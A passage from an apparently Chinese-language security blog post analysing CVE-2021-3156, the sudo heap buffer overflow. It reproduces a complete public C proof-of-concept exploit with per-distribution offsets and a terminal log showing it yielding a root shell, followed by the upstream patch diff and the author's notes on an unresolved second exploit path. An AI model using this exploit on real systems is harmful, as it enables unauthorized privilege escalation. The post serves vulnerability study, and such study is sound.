class="keyword">define</span> MAX_ENVP 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> *target_name;</span><br><span class="line">	<span class="type">char</span> *sudoedit_path;</span><br><span class="line">	<span class="type">uint32_t</span> smash_len_a;</span><br><span class="line">	<span class="type">uint32_t</span> smash_len_b;</span><br><span class="line">	<span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line">	<span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *lc_names[]=&#123;</span><br><span class="line">        <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">0x53</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">0x54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0x30</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">0x53</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">0x54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">0x185</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0xa0</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, &quot;\\\\&quot;, NULL</span></span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, NULL</span></span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; target-&gt;null_stomp_len; i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lc_len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="type">int</span> lc_num = <span class="number">0x5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *temp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">11</span>; i &gt; (<span class="number">11</span> - lc_num); i--)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = <span class="built_in">calloc</span>(target-&gt;lc_all_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, target-&gt;lc_all_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    i -= <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);</span></span><br><span class="line">    <span class="comment">// strcpy(temp, lc_names[i]);</span></span><br><span class="line">    <span class="comment">// strcpy(temp + strlen(lc_names[i]), &quot;=C.UTF-8@&quot;);</span></span><br><span class="line">    <span class="comment">// memset(temp+strlen(lc_names[i]) + 9, &#x27;A&#x27;+i, 0x60);</span></span><br><span class="line">    <span class="comment">// s_envp[envp_pos++] = temp;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// i -= 1;</span></span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line">    i-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx == <span class="number">3</span>)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(<span class="number">0xd0</span> + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, <span class="number">0xd0</span>);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">        i -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=XXXXXXXX&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="comment">// execve(target-&gt;sudoedit_path, s_argv, NULL);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[normal@172 CVE-2021-3156_blasty]$ ./sudo-hax-me-a-sandwich 3</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: <span class="string">&#x27;openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28&#x27;</span></span><br><span class="line">** pray <span class="keyword">for</span> your rootshell.. **</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line">sh-5.0<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sudo.ws/repos/sudo/rev/049ad90590be">sudo: 049ad90590be</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/plugins/sudoers/sudoers.c	Sat Jan 23 08:43:59 2021 -0700</span></span><br><span class="line"><span class="comment">+++ b/plugins/sudoers/sudoers.c	Sat Jan 23 08:43:59 2021 -0700</span></span><br><span class="line"><span class="meta">@@ -547,7 +547,7 @@</span></span><br><span class="line"></span><br><span class="line">     /* If run as root with SUDO_USER set, set sudo_user.pw to that user. */</span><br><span class="line">     /* XXX - causes confusion when root is not listed in sudoers */</span><br><span class="line"><span class="deletion">-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT) &amp;&amp; prev_user != NULL) &#123;</span></span><br><span class="line"><span class="addition">+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT) &amp;&amp; prev_user != NULL) &#123;</span></span><br><span class="line"> 	if (user_uid == 0 &amp;&amp; strcmp(prev_user, &quot;root&quot;) != 0) &#123;</span><br><span class="line"> 	    struct passwd *pw;</span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -932,8 +932,8 @@</span></span><br><span class="line">     if (user_cmnd == NULL)</span><br><span class="line"> 	user_cmnd = NewArgv[0];</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="deletion">-	if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="addition">+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT|MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="addition">+	if (!ISSET(sudo_mode, MODE_EDIT)) &#123;</span></span><br><span class="line"> 	    const char *runchroot = user_runchroot;</span><br><span class="line"> 	    if (runchroot == NULL &amp;&amp; def_runchroot != NULL &amp;&amp;</span><br><span class="line"> 		    strcmp(def_runchroot, &quot;*&quot;) != 0)</span><br><span class="line"><span class="meta">@@ -961,7 +961,8 @@</span></span><br><span class="line"> 		sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));</span><br><span class="line"> 		debug_return_int(NOT_FOUND_ERROR);</span><br><span class="line"> 	    &#125;</span><br><span class="line"><span class="deletion">-	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span></span><br><span class="line"><span class="addition">+	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &amp;&amp;</span></span><br><span class="line"><span class="addition">+		    ISSET(sudo_mode, MODE_RUN)) &#123;</span></span><br><span class="line"> 		/*</span><br><span class="line"> 		 * When running a command via a shell, the sudo front-end</span><br><span class="line"> 		 * escapes potential meta chars.  We unescape non-spaces</span><br><span class="line"><span class="meta">@@ -969,10 +970,22 @@</span></span><br><span class="line"> 		 */</span><br><span class="line"> 		for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;</span><br><span class="line"> 		    while (*from) &#123;</span><br><span class="line"><span class="deletion">-			if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))</span></span><br><span class="line"><span class="addition">+			if (from[0] == &#x27;\\\\&#x27; &amp;&amp; from[1] != &#x27;\\0&#x27; &amp;&amp;</span></span><br><span class="line"><span class="addition">+				!isspace((unsigned char)from[1])) &#123;</span></span><br><span class="line"> 			    from++;</span><br><span class="line"><span class="addition">+			&#125;</span></span><br><span class="line"><span class="addition">+			if (size - (to - user_args) &lt; 1) &#123;</span></span><br><span class="line"><span class="addition">+			    sudo_warnx(U_(&quot;internal error, %s overflow&quot;),</span></span><br><span class="line"><span class="addition">+				__func__);</span></span><br><span class="line"><span class="addition">+			    debug_return_int(NOT_FOUND_ERROR);</span></span><br><span class="line"><span class="addition">+			&#125;</span></span><br><span class="line"> 			*to++ = *from++;</span><br><span class="line"> 		    &#125;</span><br><span class="line"><span class="addition">+		    if (size - (to - user_args) &lt; 1) &#123;</span></span><br><span class="line"><span class="addition">+			sudo_warnx(U_(&quot;internal error, %s overflow&quot;),</span></span><br><span class="line"><span class="addition">+			    __func__);</span></span><br><span class="line"><span class="addition">+			debug_return_int(NOT_FOUND_ERROR);</span></span><br><span class="line"><span class="addition">+		    &#125;</span></span><br><span class="line"> 		    *to++ = &#x27; &#x27;;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 		*--to = &#x27;\\0&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>patch</code>检查了参数是否以反斜杠结尾，并在拷贝过程中对溢出进行了检测。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>针对利用<code>1</code>，我调试了一下发现没有进入<code>process_hooks_getenv</code>的路径，看源码分析，<code>github</code>中的<code>exp</code>执行的是<code>SUDO_EDITOR</code>，从源码中来看应该是位于<code>find_editor</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">find_editor</span><span class="params">(<span class="type">int</span> nfiles, <span class="type">char</span> **files, <span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> * <span class="type">const</span> *whitelist, <span class="type">const</span> <span class="type">char</span> **env_editor, <span class="type">bool</span> env_error)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ev[<span class="number">3</span>], *editor_path = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    debug_decl(find_editor, SUDOERS_DEBUG_UTIL)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If any of SUDO_EDITOR, VISUAL or EDITOR are set, choose the first one.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    *env_editor = <span class="literal">NULL</span>;</span><br><span class="line">    ev[<span class="number">0</span>] = <span class="string">&quot;SUDO_EDITOR&quot;</span>;</span><br><span class="line">    ev[<span class="number">1</span>] = <span class="string">&quot;VISUAL&quot;</span>;</span><br><span class="line">    ev[<span class="number">2</span>] = <span class="string">&quot;EDITOR&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nitems(ev); i++) &#123;</span><br><span class="line">	<span class="type">char</span> *editor = getenv(ev[i]);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而该函数在申请完<code>user_args</code>堆块之后的调用发现只有一处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Require a password if sudoers says so.  */</span></span><br><span class="line"><span class="keyword">switch</span> (check_user(validated, sudo_mode)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="literal">true</span>:</span><br><span class="line">    <span class="comment">/* user authenticated successfully. */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="literal">false</span>:</span><br><span class="line">    <span class="comment">/* Note: log_denial() calls audit for us. */</span></span><br><span class="line">    <span class="keyword">if</span> (!ISSET(validated, VALIDATE_SUCCESS)) &#123;</span><br><span class="line">      <span class="comment">/* Only display a denial message if no password was read. */</span></span><br><span class="line">      <span class="keyword">if</span> (!log_denial(validated, def_passwd_tries &lt;= <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">/* some other error, ret is -1. */</span></span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="built_in">free</span>(safe_cmnd);</span><br><span class="line">safe_cmnd = find_editor(NewArgc - <span class="number">1</span>, NewArgv + <span class="number">1</span>, &amp;edit_argc,</span><br><span class="line">                        &amp;edit_argv, <span class="literal">NULL</span>, &amp;env_editor, <span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是该函数的调用是位于<code>check_user</code>函数之后的，该函数经过调试发现需要满足两个条件，一个是密码输入正确，另一个就是用户需要在<code>sudo</code>列表中，但是满足这个条件的话就不要提权了。</p>
<p>原文章中写的环境变量为<code>SYSTEMD_BYPASS_USERDB</code>，搜索了一下该环境变量是位于<code>systemd</code>中，不知道怎么发生调用。所以现在卡住了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9F%9F%E8%AE%BE%E7%BD%AE">区域设置</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html">Sudo Heap-Based Buffer Overflow</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/blasty/CVE-2021-3156">CVE-2021-3156 PoC</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/4199921919.html">https://www.lyyl.online/posts/4199921919.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-24.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4269520279.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-14.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2020 纵横杯线下 WP</div></div></a></div><div class="next-post pull-right"><a href="/posts/599480916.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-RealWorld-CTF/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2020 RealWorld CTF easy_escape</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i 